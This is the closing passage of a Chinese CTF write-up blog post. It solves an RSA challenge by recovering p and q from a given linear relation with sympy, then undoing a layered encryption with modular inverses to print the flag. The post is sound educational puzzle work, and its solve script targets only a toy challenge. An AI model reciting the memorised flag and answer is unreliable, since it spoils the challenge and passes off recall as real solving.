+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sympy</span> <span class="kn">import</span> <span class="n">symbols</span><span class="p">,</span> <span class="n">Eq</span><span class="p">,</span> <span class="n">solve</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gmpy2</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义未知数</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="p">,</span> <span class="n">q</span> <span class="o">=</span> <span class="n">symbols</span><span class="p">(</span><span class="s2">&#34;p q&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 解方程</span>
+</span></span><span class="line"><span class="cl"><span class="n">expr2</span> <span class="o">=</span> <span class="p">[</span><span class="mi">2</span><span class="o">*</span><span class="n">p</span><span class="o">+</span><span class="mi">3</span><span class="o">*</span><span class="n">q</span><span class="o">-</span><span class="mi">54673117809069678475594947601860826118221736045735845051744912971409541561632603188516528135267179886112707141940065852170163389165168708306257365103150093</span><span class="p">,</span> <span class="n">p</span><span class="o">*</span><span class="n">q</span><span class="o">-</span><span class="mi">123448414953228974011805323696137868781943298061640108583721204983031140531897314375841622324228108297198646457634512292527604743406056418492269259916712299664727931022315281719439527653756604578385299396113560339992952472500080663133453498156861989739986186852600863076353168997852910108312422507070843691527</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">r2</span> <span class="o">=</span> <span class="n">solve</span><span class="p">(</span><span class="n">expr2</span><span class="p">,</span> <span class="p">[</span><span class="n">p</span><span class="p">,</span> <span class="n">q</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;r2:&#34;</span><span class="p">,</span> <span class="n">r2</span><span class="p">)</span>
+</span></span></code></pre></div><p>得到：</p>
+<blockquote>
+<p>p = 12384051763953430863668172341605062087552196009776396484360059546294965143403046818805051855772540020996782547927228938821561716941140613694437078638123523
+q = 9968338093720938916086200972883567314372448008727684027674931292939870424942169850302141474574033281373047348695202658175679985094295826972461069275634349</p>
+</blockquote>
+<p>然后我们根据<code>c = pow(pow(pow(m, e, n)*r1, e, n)*r2, e, n)</code>
+进行解密</p>
+<p>exp如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gmpy2</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r1</span><span class="o">=</span><span class="mi">1001</span><span class="o">*</span><span class="mi">777</span>
+</span></span><span class="line"><span class="cl"><span class="n">r2</span><span class="o">=</span><span class="mi">1002</span><span class="o">*</span><span class="mi">777</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="mi">12384051763953430863668172341605062087552196009776396484360059546294965143403046818805051855772540020996782547927228938821561716941140613694437078638123523</span>
+</span></span><span class="line"><span class="cl"><span class="n">q</span> <span class="o">=</span> <span class="mi">9968338093720938916086200972883567314372448008727684027674931292939870424942169850302141474574033281373047348695202658175679985094295826972461069275634349</span>
+</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="mi">70355784775921655880380025465489949573241301926464797611681833071256665441460869302372712558837199110767728290007652944220079907048322612573185968943864339915304868935319658344195708544022979094906385190425552202576200107202487083736800245172584184112275476974513051986233708501062909943346214681580048469716</span>
+</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mh">0x10001</span>
+</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mi">123448414953228974011805323696137868781943298061640108583721204983031140531897314375841622324228108297198646457634512292527604743406056418492269259916712299664727931022315281719439527653756604578385299396113560339992952472500080663133453498156861989739986186852600863076353168997852910108312422507070843691527</span>
+</span></span><span class="line"><span class="cl"><span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">invert</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">phi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">c1</span> <span class="o">=</span> <span class="n">m</span><span class="o">*</span><span class="n">gmpy2</span><span class="o">.</span><span class="n">invert</span><span class="p">(</span><span class="n">r2</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">m1</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c1</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">c2</span> <span class="o">=</span> <span class="n">m1</span><span class="o">*</span><span class="n">gmpy2</span><span class="o">.</span><span class="n">invert</span><span class="p">(</span><span class="n">r1</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">m2</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c2</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">m2</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span></code></pre></div><p>在共模下做除法我们需要求出r1和r2关于n的逆元$r_1^{-1}$和$r_2^{-1}$</p>
+<p>最终解得flag为：</p>
+<p><code>HCTF{D0_y0u_900d_4t_m47h?###}</code></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://smera1d0.github.io/tags/ctf/">CTF</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://smera1d0.github.io/posts/newstar-ctf-2023-pwn/">
+    <span class="title">« 上一页</span>
+    <br>
+    <span>Newstar CTF 2023 pwn</span>
+  </a>
+</nav>
+
+  </footer><script src="https://giscus.app/client.js"
+        data-repo="Smera1d0/Smera1d0.github.io"
+        data-repo-id="R_kgDOIXSe_Q"
+        data-category="Announcements"
+        data-category-id="DIC_kwDOIXSe_c4CmMtR"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+</script>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>© <a href="https://github.com/adityatelange/hugo-PaperMod/graphs/contributors">PaperMod Contributors</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
